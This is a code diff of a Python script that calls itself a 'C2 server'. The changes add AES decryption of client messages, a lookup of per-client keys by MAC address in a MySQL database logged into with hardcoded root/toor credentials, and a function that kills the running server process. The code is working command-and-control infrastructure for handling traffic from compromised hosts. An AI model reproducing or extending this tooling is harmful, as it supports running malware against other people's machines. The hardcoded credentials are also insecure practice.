@@ -7,8 +7,45 @@ import MySQLdb
 import base64
 import string
 import codecs
+import subprocess
 import time
+import signal
+import os
 from time import gmtime, strftime
+from Crypto import Random
+from Crypto.Cipher import AES
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+def kill_server():
+	p = subprocess.Popen(['ps', '-ax'], stdout=subprocess.PIPE)
+	out, err = p.communicate()
+	for line in out.splitlines():
+		if 'python server.py' in line:
+			pid = int(line.split(None, 1)[0])
+			os.kill(pid, signal.SIGKILL)
+			print("[+] C2 server stopped !")
+			print(" ")
+def get_key_from_mac(mac):
+	# Take the mac address of an host and retreive his AES key
+	db = MySQLdb.connect("localhost","root","toor","clients")
+        cursor = db.cursor()
+	cursor.execute( """SELECT aes_key FROM clients.clients WHERE mac = %s""",([mac]))
+        rows = cursor.fetchall()
+        db.close()
+	key = str(rows).replace("(('","").replace("',),)","")
+	# print("aes key :" + str(key))
+	return key
+
+def decrypt(msg,key):
+	# Decipher function
+	msg = base64.b64decode(msg)
+	iv = msg[:AES.block_size]
+	cipher = AES.new(key, AES.MODE_OFB, iv)
+	msg = unpad(cipher.decrypt(msg[AES.block_size:]))
+	return msg
 
 def check_aes_key():
 	# Check if a client don't have is decryption key in the database. If not, generate it.
@@ -19,7 +56,8 @@ def check_aes_key():
         db.close()
 
 	if str(rows) == "()":
-		print("[+] All the clients keys are up to date")
+		# print("[+] All the clients keys are up to date")
+		pass
 	else:
 		chaine = str(rows)
 		chaine1 = chaine.replace("(","").replace(")","").replace("L,","").replace(" ","")
